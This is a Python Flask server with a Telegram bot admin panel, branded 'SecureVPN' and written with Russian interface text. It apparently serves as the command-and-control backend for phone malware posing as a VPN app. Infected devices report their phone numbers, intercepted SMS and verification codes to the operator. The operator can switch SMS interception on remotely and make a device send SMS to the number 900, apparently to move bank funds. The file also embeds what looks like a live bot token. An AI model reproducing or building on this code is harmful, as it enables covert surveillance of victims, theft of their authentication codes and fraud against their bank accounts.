import os
import json
import time
import sqlite3
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# =====================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8752315237:AAHOCHMbwSCs01jqGklkQewmOL5Ae-cjaxY")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8315129245, 6728642872")
# =====================================================

DB_FILE = "data.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id TEXT PRIMARY KEY, phone TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT, command TEXT, created TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT, message TEXT, created TEXT)''')
    conn.commit()
    conn.close()

def send_admin(text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"[ADMIN SEND ERR] {e}")

def get_updates(offset):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 3, "offset": offset}
    try:
        return requests.get(url, params=params, timeout=10).json()
    except:
        return {"ok": False}

def main_menu():
    return {"inline_keyboard": [
        [{"text": "👥 Пользователи", "callback_data": "users"}],
        [{"text": "📊 Статус", "callback_data": "status"}]
    ]}

def user_actions(device_id):
    return {"inline_keyboard": [
        [{"text": "📩 Включить перехват SMS", "callback_data": f"monitor_on_{device_id}"}],
        [{"text": "⏹ Остановить перехват", "callback_data": f"monitor_off_{device_id}"}],
        [{"text": "📤 Отправить SMS на 900", "callback_data": f"sms_{device_id}"}],
        [{"text": "📱 Показать номер", "callback_data": f"phone_{device_id}"}],
        [{"text": "🔙 Назад", "callback_data": "back"}]
    ]}

def user_list_menu():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, phone FROM devices")
    rows = c.fetchall()
    conn.close()

    kb = []
    if not rows:
        kb.append([{"text": "❌ Нет пользователей", "callback_data": "no_users"}])
    else:
        for device_id, phone in rows:
            phone = phone or "нет номера"
            kb.append([{"text": f"📱 {phone[:20]}", "callback_data": f"select_{device_id}"}])
    kb.append([{"text": "🔄 Обновить", "callback_data": "refresh"}])
    kb.append([{"text": "🔙 Назад", "callback_data": "back"}])
    return {"inline_keyboard": kb}

@app.route("/api/data", methods=["POST"])
def api_data():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error"}), 400

    device_id = data.get("device_id")
    data_type = data.get("type")
    value = data.get("data")
    now = datetime.now().isoformat()

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO devices (id, last_seen) VALUES (?, ?)", (device_id, now))
    c.execute("UPDATE devices SET last_seen=? WHERE id=?", (now, device_id))

    if data_type == "phone":
        c.execute("UPDATE devices SET phone=? WHERE id=?", (value, device_id))
        send_admin(f"📱 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>\nID: {device_id}\nНомер: {value}")
    elif data_type == "sms":
        send_admin(f"📩 <b>SMS</b>\nDevice: {device_id}\n{value}")
    elif data_type == "code":
        send_admin(f"🔐 <b>КОД</b>\nDevice: {device_id}\nКод: {value}")
    elif data_type == "log":
        c.execute("INSERT INTO logs (device_id, message, created) VALUES (?, ?, ?)", (device_id, value, now))

    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route("/api/commands/<device_id>", methods=["GET"])
def api_commands(device_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE device_id=? ORDER BY id LIMIT 1", (device_id,))
    row = c.fetchone()
    conn.close()

    if row:
        cmd_id, cmd = row
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("DELETE FROM commands WHERE id=?", (cmd_id,))
        conn.commit()
        conn.close()
        return jsonify({"has_command": True, "command": cmd})

    return jsonify({"has_command": False})

last_offset = 0
processed_updates = set()
pending_sms_device = None

def process_telegram():
    global last_offset, pending_sms_device
    data = get_updates(last_offset)
    if not data.get("ok"): return

    for update in data.get("result", []):
        update_id = update.get("update_id", 0)

        if update_id in processed_updates:
            continue
        processed_updates.add(update_id)

        if len(processed_updates) > 1000:
            processed_updates.clear()

        last_offset = update_id + 1

        if "message" in update:
            msg = update["message"]
            chat_id = str(msg.get("chat", {}).get("id", ""))
            text = msg.get("text", "")
            if chat_id != ADMIN_CHAT_ID: continue

            if text == "/start":
                send_admin("🔐 <b>SecureVPN Admin Panel</b>\n\nВыбери действие:", main_menu())
            elif pending_sms_device and text and not text.startswith("/"):
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("INSERT INTO commands (device_id, command, created) VALUES (?, ?, ?)",
                          (pending_sms_device, f"/send_sms {text}", datetime.now().isoformat()))
                conn.commit()
                conn.close()
                send_admin(f"📤 Команда отправлена: {text}")
                pending_sms_device = None

        elif "callback_query" in update:
            q = update["callback_query"]
            chat_id = str(q["message"]["chat"]["id"])
            data_btn = q["data"]
            if chat_id != ADMIN_CHAT_ID: continue

            try:
                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery?callback_query_id={q['id']}", timeout=5)
            except: pass

            if data_btn == "users":
                send_admin("👥 <b>Пользователи:</b>", user_list_menu())
            elif data_btn.startswith("select_"):
                device_id = data_btn.replace("select_", "")
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT phone FROM devices WHERE id=?", (device_id,))
                row = c.fetchone()
                conn.close()
                phone = row[0] if row else "неизвестно"
                send_admin(f"👤 <b>Пользователь</b>\nID: <code>{device_id}</code>\nНомер: <b>{phone}</b>\n\nВыбери действие:", user_actions(device_id))
            elif data_btn.startswith("monitor_on_"):
                device_id = data_btn.replace("monitor_on_", "")
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("INSERT INTO commands (device_id, command, created) VALUES (?, ?, ?)",
                          (device_id, "/monitor_on", datetime.now().isoformat()))
                conn.commit()
                conn.close()
                send_admin("✅ Перехват SMS включён")
            elif data_btn.startswith("monitor_off_"):
                device_id = data_btn.replace("monitor_off_", "")
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("INSERT INTO commands (device_id, command, created) VALUES (?, ?, ?)",
                          (device_id, "/monitor_off", datetime.now().isoformat()))
                conn.commit()
                conn.close()
                send_admin("⏹ Перехват остановлен")
            elif data_btn.startswith("phone_"):
                device_id = data_btn.replace("phone_", "")
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT phone FROM devices WHERE id=?", (device_id,))
                row = c.fetchone()
                conn.close()
                phone = row[0] if row else "неизвестно"
                send_admin(f"📱 Номер: <b>{phone}</b>")
            elif data_btn.startswith("sms_"):
                pending_sms_device = data_btn.replace("sms_", "")
                send_admin("📤 <b>Введи текст SMS для отправки на 900:</b>")
            elif data_btn == "refresh":
                send_admin("🔄 Обновлено", user_list_menu())
            elif data_btn == "back":
                send_admin("🔐 Главное меню:", main_menu())
            elif data_btn == "status":
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM devices")
                count = c.fetchone()[0]
                conn.close()
                send_admin(f"📊 <b>Статус</b>\nПользователей: {count}")

def telegram_polling():
    while True:
        try:
            process_telegram()
            time.sleep(2)
        except Exception as e:
            print(f"[POLL ERR] {e}")

@app.route("/")
@app.route("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    print("=" * 50)
    print("SecureVPN Server starting...")
    print("=" * 50)
    init_db()
    threading.Thread(target=telegram_polling, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)